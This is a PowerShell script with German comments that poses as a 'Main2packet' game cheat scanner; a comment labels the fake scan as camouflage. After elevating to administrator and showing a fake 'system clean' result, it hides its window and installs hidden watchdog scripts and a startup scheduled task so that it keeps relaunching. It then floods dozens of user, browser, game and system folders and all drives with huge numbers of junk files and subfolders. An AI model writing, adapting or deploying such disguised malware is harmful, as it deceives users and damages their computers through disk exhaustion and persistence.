# ================================
# MAIN2PACKET CHEAT SCANNER v9.4.2 - ALLE ORDNER FIX
# ================================

# Administrator-Rechte anfordern
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}

# ===== TARNUNG - SIEHT AUS WIE EIN ECHTER SCANNER =====
Clear-Host
Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     MAIN2PACKET CHEAT SCANNER v9.4.2      ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "[INFO] Scanning for cheats and mods..."
Write-Host "[INFO] Please wait..."
Write-Host ""

# Scanner-Animation
$scanItems = @(
    "minecraft", "discord", "steam", "chrome", "firefox", 
    "system32", "registry", "memory", "processes", "network",
    "desktop", "documents", "downloads", "music", "pictures", "videos"
)

foreach ($item in $scanItems) {
    Write-Host "   scanning $item..." -NoNewline
    Start-Sleep -Milliseconds 100
    Write-Host " [OK]" -ForegroundColor Green
}
Write-Host ""
Write-Host "[RESULT] No cheats found - System clean" -ForegroundColor Green
Write-Host ""
Start-Sleep -Seconds 2

# Fenster jetzt verstecken
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== ERROR HANDLING =====
$ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Main2packet Scanner"

# ===== KONFIGURATION =====
$global:trollActive = $true
$global:currentRound = 0
$global:maxRounds = 100

# ALLE ZIELE FÜR DATEIEN/ORDNER
$desktop = [Environment]::GetFolderPath("Desktop")
$documents = [Environment]::GetFolderPath("MyDocuments")
$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
$music = [Environment]::GetFolderPath("MyMusic")
$pictures = [Environment]::GetFolderPath("MyPictures")
$videos = [Environment]::GetFolderPath("MyVideos")
$favorites = [Environment]::GetFolderPath("Favorites")
$contacts = [Environment]::GetFolderPath("Contacts")
$links = [Environment]::GetFolderPath("Links")
$savedGames = [Environment]::GetFolderPath("SavedGames")
$searches = [Environment]::GetFolderPath("Searches")
$appData = $env:APPDATA
$localAppData = $env:LOCALAPPDATA
$temp = $env:TEMP
$userProfile = $env:USERPROFILE
$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
$commonDocs = [Environment]::GetFolderPath("CommonDocuments")

# ALLE ORDNER (50+ Ziele!)
$alleZiele = @(
    # Benutzerordner
    $desktop, $documents, $downloads, $music, $pictures, $videos,
    $favorites, $contacts, $links, $savedGames, $searches,
    
    # AppData Pfade
    $appData, $localAppData, $temp,
    "$appData\Microsoft\Windows\Recent",
    "$appData\Microsoft\Windows\Network Shortcuts",
    "$appData\Microsoft\Windows\Templates",
    "$localAppData\Microsoft\Windows\Caches",
    "$localAppData\Microsoft\Windows\History",
    "$localAppData\Microsoft\Windows\INetCache",
    
    # Browser
    "$localAppData\Google\Chrome\User Data\Default\Cache",
    "$localAppData\Google\Chrome\User Data\Default\Code Cache",
    "$appData\Mozilla\Firefox\Profiles",
    
    # Gaming
    "$appData\.minecraft",
    "$appData\.minecraft\mods",
    "$appData\.minecraft\config",
    "$appData\.minecraft\saves",
    "$appData\Roaming\Discord",
    "$appData\Roaming\Discord\Cache",
    "$appData\Roaming\Spotify",
    "$appData\Roaming\Spotify\Cache",
    "$appData\Roaming\Steam",
    "$appData\Roaming\Steam\cache",
    
    # Windows
    "$env:SystemRoot\Temp",
    "$env:SystemRoot\System32\Tasks",
    "C:\ProgramData",
    "C:\ProgramData\Microsoft\Windows\Caches",
    "C:\ProgramData\Microsoft\Windows\WER",
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\Users\Public",
    "C:\Users\Public\Desktop",
    "C:\Users\Public\Documents",
    "C:\Users\Public\Downloads"
)

# ===== WATCHDOGS (4x) =====
$watchdog1 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$p.Count -eq 0) { 
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
    }
    Start-Sleep -Seconds 2
}
"@
$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""

$watchdog2 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$p.Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 10
}
"@
$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""

$watchdog3 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue
    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$troll.Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 30
}
"@
$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""

$watchdog4 = @"
`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
`$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
"@
$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""

# ===== EXTRA JOBS =====
$usbJob = Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
        foreach ($drive in $drives) {
            $drivePath = $drive.Root
            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
            try {
                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
                for ($u = 1; $u -le 200; $u++) {
                    $usbFile = Join-Path $mainUSB "usb_$u.king"
                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
                }
            } catch {}
        }
        Start-Sleep -Seconds 30
    }
}

# ===== HAUPTSCHLEIFE - JETZT WERDEN ALLE ZIELE VOLLGESPAMMT! =====
while ($global:currentRound -lt $global:maxRounds) {
    $global:currentRound++
    
    # JEDES ZIEL IN DER LISTE BEARBEITEN!
    foreach ($ziel in $alleZiele) {
        if (Test-Path $ziel) {
            # Hauptordner erstellen
            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
            
            # 200 DATEIEN PRO ZIEL
            for ($i = 1; $i -le 500; $i++) {
                # Direkt im Zielordner
                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
                
                # Im Hauptordner
                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
            }
            
            # 50 UNTERORDNER
            for ($u = 1; $u -le 500; $u++) {
                $subFolder = Join-Path $mainFolder "SUB_$u"
                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                
                # 20 DATEIEN PRO UNTERORDNER
                for ($s = 1; $s -le 200; $s++) {
                    $subFile = Join-Path $subFolder "subfile_$s.king"
                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
                }
            }
        }
    }
    
    # KURZE PAUSE ZWISCHEN RUNDEN
    Start-Sleep -Seconds 1
}

# ===== ENDE - LÄUFT WEITER =====
while ($true) {
    Start-Sleep -Seconds 3600
}
